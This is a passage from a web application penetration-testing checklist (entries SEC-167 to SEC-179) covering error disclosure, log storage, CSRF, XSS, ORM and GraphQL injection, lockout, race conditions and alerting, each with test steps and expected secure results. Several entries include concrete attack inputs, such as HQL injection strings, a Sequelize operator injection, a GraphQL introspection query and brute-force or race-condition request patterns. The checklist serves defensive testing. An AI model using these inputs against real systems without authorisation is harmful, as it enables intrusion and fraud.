**Test Category:** Information Disclosure (WSTG-ERRH-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Penetration Testing

**Test Steps:** 1. Trigger various application errors. 2. Check for stack traces in error responses. 3. Look for database details and file paths and version numbers. 4. Test with invalid input types and methods. 5. Check debug mode status.

**Expected Result:** Application must return generic user-friendly error messages in production without exposing stack traces or internal system details.

**Payload Example:**

```
Send malformed requests;invalid content types;trigger 500 errors;check for framework debug pages;look for version disclosure
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SEC-167 — Log Storage Security Assessment
**Test Category:** Logging (WSTG-CONF-09) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Security Audit Logs

**Test Steps:** 1. Check where logs are stored. 2. Verify access controls on log storage. 3. Check if logs are accessible via web. 4. Verify log encryption in storage. 5. Check for log backup security.

**Expected Result:** Audit log storage must be secured with proper access controls and encryption and not be publicly accessible via web.

**Payload Example:**

```
Check /logs/;/var/log/;S3 bucket permissions for logs;verify log storage access controls;check backup security
```

**Impact:** Insufficient or injectable logging -&gt; forensic gaps / log injection / audit bypass.

**Tools:** Burp Suite;DirBuster;AWS CLI

**References:** CWE-778; OWASP Logging &amp; Monitoring Failures (A09)

---

## SEC-168 — CSRF Token Per-Request vs Per-Session
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** CSRF Protection

**Test Steps:** 1. Capture CSRF token on first page load. 2. Submit multiple forms using the same token. 3. Check if the token changes per request. 4. Verify token rotation on sensitive operations. 5. Test token lifetime.

**Expected Result:** CSRF tokens should ideally be per-request for maximum security or at minimum per-session with proper binding.

**Payload Example:**

```
Use same CSRF token for 10+ sequential requests;check if token changes;compare per-request vs per-session behavior
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## SEC-169 — Content-Type Header XSS Prevention
**Test Category:** Cross-Site Scripting (WSTG-INPV-01) · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** XSS Prevention

**Test Steps:** 1. Check Content-Type headers on all responses. 2. Upload files and check serving Content-Type. 3. Test if responses with wrong Content-Type allow XSS. 4. Verify charset specification.

**Expected Result:** All responses must include correct Content-Type headers with explicit charset to prevent Content-Type confusion XSS.

**Payload Example:**

```
Upload HTML file and check if served as text/html vs application/octet-stream;verify charset=UTF-8;check X-Content-Type-Options
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;Browser DevTools

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SEC-170 — ORM Injection Testing
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** SQL Injection Prevention

**Test Steps:** 1. Identify if ORM is used for database operations. 2. Test for ORM-specific injection patterns. 3. Test for raw query usage within ORM. 4. Check for HQL/JPQL injection in Java apps. 5. Test for Sequelize/Mongoose injection in Node.js.

**Expected Result:** Application must use ORM safely without raw queries and protect against ORM-specific injection patterns.

**Payload Example:**

```
Test HQL: from User where name='test' OR '1'='1';Sequelize: {where:{[Op.or]:[{id:1},{id:{[Op.gt]:0}}]}};Django ORM filter bypass
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;SQLMap;Custom Scripts

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SEC-171 — GraphQL Injection Testing
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Input Sanitization

**Test Steps:** 1. Test for introspection query availability. 2. Test for field suggestion abuse. 3. Test for query batching DoS. 4. Test for nested query depth attack. 5. Check for directive injection.

**Expected Result:** GraphQL must disable introspection in production and implement query complexity limits and field-level authorization.

**Payload Example:**

```
{__schema{types{name;fields{name}}}};batch 100+ queries;nest 20+ levels deep;test directive @skip and @include injection
```

**Impact:** GraphQL abuse -&gt; introspection/IDOR/batching DoS -&gt; data exposure or availability.

**Tools:** InQL;GraphQL Voyager;Burp Suite;Altair

**References:** CWE-400; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP GraphQL Cheat Sheet; PortSwigger

---

## SEC-172 — Account Lockout Testing
**Test Category:** Authentication (WSTG-ATHN-03) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Rate Limiting

**Test Steps:** 1. Attempt multiple failed logins for a specific account. 2. Count attempts before lockout. 3. Check lockout duration. 4. Verify if lockout applies to valid accounts only. 5. Test for lockout bypass via API variations.

**Expected Result:** Application must implement account lockout after 5-10 failed attempts with increasing lockout duration and notification to the account owner.

**Payload Example:**

```
Send 20 failed login attempts;check at which attempt lockout triggers;verify lockout duration;test for bypass via different endpoints
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite Intruder;Hydra;Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## SEC-173 — IP Block Notification and Logging
**Test Category:** Logging (WSTG-CONF-09) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** IP Blocking

**Test Steps:** 1. Trigger IP blocking. 2. Verify the blocking event is logged. 3. Check if admin is notified of blocking events. 4. Verify the blocked IP is recorded. 5. Check for blocking reason documentation.

**Expected Result:** IP blocking events must be logged with full details including blocked IP and reason and timestamp and admin notifications for significant blocks.

**Payload Example:**

```
Trigger IP block and verify audit log entry with blocked_ip;block_reason;timestamp;triggered_by;verify admin alert
```

**Impact:** Insufficient or injectable logging -&gt; forensic gaps / log injection / audit bypass.

**Tools:** Manual Review;Log Analysis Tools

**References:** CWE-778; OWASP Logging &amp; Monitoring Failures (A09)

---

## SEC-174 — Chargeback Fraud Detection Testing
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Fraud Detection

**Test Steps:** 1. Complete a purchase and request chargeback. 2. Check if fraud detection flags the chargeback. 3. Test multiple chargeback patterns. 4. Verify account restrictions after chargebacks.

**Expected Result:** Application must detect and flag chargeback fraud patterns and implement appropriate account restrictions for repeated chargebacks.

**Payload Example:**

```
Complete purchase;initiate chargeback;attempt new purchase;check for fraud_flag;verify account restriction after multiple chargebacks
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Manual Testing;Burp Suite

**References:** CWE-840; PortSwigger Business logic

---

## SEC-175 — CSP Trusted Types Evaluation
**Test Category:** Security Misconfiguration (WSTG-CONF-07) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Content Security Policy

**Test Steps:** 1. Check if CSP includes Trusted Types enforcement. 2. Verify require-trusted-types-for 'script' directive. 3. Test if DOM XSS sinks are protected by Trusted Types. 4. Check for Trusted Types policy configuration.

**Expected Result:** Application should implement CSP Trusted Types to prevent DOM XSS by requiring safe type creation for dangerous sinks like innerHTML.

**Payload Example:**

```
Check for require-trusted-types-for 'script';trusted-types default;test innerHTML assignment without TrustedHTML
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Browser DevTools;Burp Suite

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## SEC-176 — Cryptographic Random Number Generation
**Test Category:** Cryptography (WSTG-CRYP-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Encryption (At Rest / In Transit)

**Test Steps:** 1. Identify all random number generation in the application. 2. Check if Math.random() or similar weak PRNGs are used for security functions. 3. Verify CSPRNG usage for tokens and keys. 4. Test random number entropy.

**Expected Result:** Application must use cryptographically secure random number generators (CSPRNG) for all security-critical operations including token and key generation.

**Payload Example:**

```
Check source for Math.random();rand();mt_rand() used for tokens/keys;verify use of crypto.randomBytes();SecureRandom;os.urandom()
```

**Impact:** Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass.

**Tools:** Source Code Review;Burp Suite Sequencer

**References:** CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP

---

## SEC-177 — DAST Integration in CI/CD Pipeline
**Test Category:** Vulnerability Assessment (WSTG-INFO-08) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Vulnerability Scanning

**Test Steps:** 1. Verify DAST scanning is integrated in CI/CD. 2. Check scan frequency and trigger conditions. 3. Verify scan results are reviewed and actioned. 4. Check for automated blocking of critical findings.

**Expected Result:** DAST scanning must be integrated into the CI/CD pipeline with automated blocking of deployments containing critical vulnerabilities.

**Payload Example:**

```
Verify OWASP ZAP or Burp Suite Enterprise integration in CI/CD;check scan policies;verify gating criteria
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** OWASP ZAP;Burp Suite Enterprise;GitLab DAST;GitHub Actions

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## SEC-178 — Race Condition Testing Across All Critical Functions
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Penetration Testing

**Test Steps:** 1. Identify all critical operations like payments and transfers and redemptions. 2. Send concurrent requests to each operation. 3. Check for double-processing. 4. Verify atomic transaction handling. 5. Test with varying concurrency levels.

**Expected Result:** All critical operations must be atomic and idempotent preventing any form of double-processing through race conditions.

**Payload Example:**

```
Send 50 concurrent POST /api/payment requests;concurrent POST /api/transfer;concurrent POST /api/redeem using Turbo Intruder
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder;Burp Suite;Custom Scripts;race-the-web

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## SEC-179 — Security Event Alerting Verification
**Test Category:** Logging (WSTG-CONF-09) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Security Audit Logs

**Test Steps:** 1. Trigger critical security events like brute force and privilege escalation and data exfiltration patterns. 2. Verify real-time alerts are generated. 3. Check alert notification channels. 4. Verify alert response procedures.

**Expected Result:** Critical security events must trigger real-time alerts to security team through configured notification channels with response procedures.

**Payload Example:**

```
Trigger 10 failed logins;attempt privilege escalation;bulk data export;verify SIEM alert generation and notification
```

**Impact:** Insufficient or injectable logging -&gt; forensic gaps / log injection / audit bypass.

**Tools:** Manual Testing;SIEM;Log Analysis Tools

**References:** CWE-778; OWASP Logging &amp; Monitoring Failures (A09)

---
